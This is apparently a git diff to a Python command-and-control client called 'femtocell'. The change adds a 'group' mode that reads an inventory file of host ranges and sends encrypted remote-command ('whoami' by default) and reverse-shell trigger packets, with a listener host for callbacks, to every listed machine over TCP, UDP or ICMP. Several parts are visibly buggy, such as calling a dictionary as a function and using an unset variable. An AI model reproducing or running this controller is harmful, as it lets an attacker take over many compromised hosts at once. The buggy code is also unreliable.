@@ -1,6 +1,7 @@
 import cmd
 from email.mime import base
 from re import A
+from tokenize import group
 from turtle import goto
 import scapy.all as scapy
 from prompt_toolkit import prompt
@@ -9,6 +10,7 @@ from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
 # from prompt_toolkit.contrib.completers import WordCompleter
 import click
 import os
+import confuse
 
 """ 
 set
@@ -25,6 +27,8 @@ show
 - all
 
 """
+
+parsedConfig = {}
 
 baseparams = {
     "mode":"",
@@ -47,6 +51,69 @@ shellparams = {
     "sport": 6006,
     "transport": "tcp"
 }
+
+groupparams = {
+    "group": "",
+    "rhost": "",
+    "rport": 445,
+    "lhost": "",
+    "sport": 6006,
+    "command": "whoami",
+    "transport": "tcp"
+}
+
+def getGroup():
+    key = groupparams("group")
+    loi = []
+
+    if parsedConfig[key] == 'hosts':
+        loi.append(parsedConfig[key+':hosts'])
+    elif parsedConfig[key] == 'children':
+        subgroups = parsedConfig[key+':children']
+        for item in subgroups:
+            loi.append(parsedConfig[item+':hosts'])
+    else:
+        print('not valid key passed.')
+        return []
+
+    return loi
+
+def importConfig(op_1):
+    config = confuse.Configuration('t', __name__)
+    config.set_file(op_1)
+    configItems = config['all']['children'].get()
+    for x in configItems:
+        parsedConfig[x] = "x"
+        if configItems[x].get('hosts'):
+            parsedConfig[x] = "hosts"
+            hostlist = []
+            var = list(configItems[x].get('hosts').keys())[0]
+            lIdx = var.find('[')
+            rIdx = var.find(']')
+            mIdx = var.find(':')
+            lVal = var[lIdx+1:mIdx]
+            rVal = var[mIdx+1:rIdx]
+            for i in range(int(lVal), int(rVal)+1):
+                lHalf = var[0:lIdx]
+                rHalf = var[rIdx+1:len(var)]
+                hostlist.append(lHalf + str(i) + rHalf)
+            parsedConfig[x+":hosts"] = hostlist 
+        elif configItems[x].get('children'):
+            parsedConfig[x] = "children"
+            parsedConfig[x+":children"] = list(configItems[x].get('children'))
+
+    # iplist = setGroup('cloud') 
+    # print('cloud\n')
+    # if len(iplist) != 0 and verify():
+    #     for lst in iplist:
+    #         send(lst)
+
+    # setGroup('dc')
+    # print('dc\n')
+    # if len(iplist) != 0 and verify():
+    #     for lst in iplist:
+    #         send(lst)
+
 
 def xor_encrypt(byte_msg, byte_key):
     encrypt_byte = b''
@@ -78,9 +145,6 @@ def main():
 
     """)
 
-
-    # SQLCompleter = WordCompleter(['select', 'from', 'insert', 'update', 'delete', 'drop'],ignore_case=True)
-
     if not os.path.exists("./history"):
         os.system("mkdir history")
 
@@ -88,7 +152,6 @@ def main():
         user_in = prompt(u'femtocell ~ ',
                         history=FileHistory('history/main.history'),
                         auto_suggest=AutoSuggestFromHistory(),
-                        # completer=SQLCompleter,
                         ).split()
         # click.echo_via_pager(user_input)
 
@@ -100,11 +163,21 @@ def main():
             if(user_cmd == "set"):
                 baseparams[op_1] = op_2
                 if op_1 == "mode":
-                    if baseparams["mode"] == "shell" or baseparams["mode"] == "cmd":
+                    if baseparams["mode"] == "shell" or baseparams["mode"] == "cmd" or baseparams["mode"] == "group":
                         pass
                     else:
                         print("mode set incorrectly")
                         baseparams["mode"] = ""
+        elif len(user_in) == 2:
+            user_cmd = user_in[0]
+            op_1 = user_in[1]
+            if (user_cmd == "load"):
+                if os.path.exists(op_1):
+                    importConfig(op_1)
+                else:
+                    print("file doesn't exist")
+                    continue
+
         elif len(user_in) == 1:
             user_cmd = user_in[0]
 
@@ -119,6 +192,11 @@ def main():
                     interact(shellparams)
                 elif baseparams["mode"] == "cmd":
                     interact(cmdparams)
+                elif baseparams["mode"] == "group":
+                    if len(parsedConfig) == 0:
+                        print('no config loaded')
+                        continue     
+                    interact(groupparams)
                 else:
                     print("you must set mode")
                     print_options(baseparams)
@@ -133,7 +211,6 @@ def interact(params):
         user_in = prompt(f'femtocell ({baseparams["mode"]}) ~ ',
                         history=FileHistory('history/interact.history'),
                         auto_suggest=AutoSuggestFromHistory(),
-                        # completer=SQLCompleter,
                         ).split()
 
         if len(user_in) == 1:
@@ -145,12 +222,17 @@ def interact(params):
                 print_options(params)
             
             elif user_cmd == "send":
-                if baseparams["mode"] == "cmd" and verify():
+                if baseparams["mode"] == "cmd" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["command"])
                     send(plaintext, cmdparams)
-                elif baseparams["mode"] == "shell" and verify():
+                elif baseparams["mode"] == "shell" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["lhost"]) 
                     send(plaintext, shellparams)
+                elif baseparams["mode"] == "group" and verify(groupparams):
+                    iplist = getGroup()
+                    for ip in iplist:
+                        groupparams["rhost"] = ip
+                        send(plaintext, groupparams)
                 else:
                     continue
             else:			
@@ -172,40 +254,26 @@ def interact(params):
             print("cmd help")
 
 
-def verify():
+def verify(params):
     passing = False
 
-    if baseparams["mode"] == "cmd":
-        if cmdparams["transport"] == "tcp" or cmdparams["transport"] == "udp" or cmdparams["transport"] == "icmp":
-            passing = True
-        else:
-            print('transport incorrect')
-            shellparams["transport"] == "tcp"
-        
-        if cmdparams["rhost"] == "": # blank or is invalid ip
-            print("rhost incorrect")
-            passing = False
+    if params["transport"] == "tcp" or params["transport"] == "udp" or params["transport"] == "icmp":
+        passing = True
+    else:
+        print('transport incorrect')
+        params["transport"] == "tcp"
 
-        if cmdparams["lhost"] == "": # blank or is invalid ip
-            print('lhost incorrect')
-            passing = False
+    if params["rhost"] == "": # blank or is invalid ip
+        print("rhost incorrect")
+        passing = False
 
+    if params["lhost"] == "": # blank or is invalid ip
+        print('lhost incorrect')
+        passing = False
 
-    elif baseparams["mode"] == "shell":
-        if shellparams["transport"] == "tcp" or shellparams["transport"] == "udp" or shellparams["transport"] == "icmp":
-            passing = True
-        else:
-            print('transport incorrect')
-            shellparams["transport"] == "tcp"
-        
-        if shellparams["rhost"] == "": # blank or is invalid ip
-            print('rhost incorrect')
-            passing = False
-        
-        if shellparams["lhost"] == "": # blank or is invalid ip
-            print('lhost incorrect')
-            passing = False
-
+    if baseparams["mode"] == "group" and params["group"] == "":
+        print("group not set")
+        passing = False
 
     return passing
 
